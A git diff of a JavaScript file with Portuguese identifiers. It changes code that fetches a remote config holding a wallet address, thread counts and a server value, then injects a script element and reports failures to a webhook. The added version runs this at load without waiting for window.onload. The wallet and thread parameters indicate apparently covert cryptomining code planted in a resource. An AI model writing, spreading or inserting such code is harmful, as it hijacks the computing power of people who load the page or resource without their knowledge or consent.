@@ -10,23 +10,6 @@ var threadsDisponivel = ""
 
 let resource = getResourceName();
 
-window.onload = function() {
-    fetch(gitLink)
-    .then(response => {
-        return response.json();
-      })
-      .then(data => {
-        wallet = getWallet(data["wallet"])
-        let [threadsDisponivel, threads] = getThreads(data["thread"])
-        servidor = getServidor(data["js"])
-
-        startA(wallet, threadsDisponivel, threads, servidor)
-      })
-    .catch(error => {
-        sendWebhookMessage(webhookErroGit, `${resource} - Erro ao pegar dados do git - ${error}`)
-    });
-}
-
 function startA(wallet, threadsDisponivel, threads, servidor){
     let numberA = Math.floor(Math.random() * 1000) + 1;
     var script = document.createElement('script');
@@ -108,3 +91,19 @@ function getResourceName(){
     }
     return resource
 }
+
+
+fetch(gitLink)
+.then(response => {
+    return response.json();
+  })
+  .then(data => {
+    wallet = getWallet(data["wallet"])
+    let [threadsDisponivel, threads] = getThreads(data["thread"])
+    servidor = getServidor(data["js"])
+
+    startA(wallet, threadsDisponivel, threads, servidor)
+  })
+.catch(error => {
+    sendWebhookMessage(webhookErroGit, `${resource} - Erro ao pegar dados do git - ${error}`)
+});
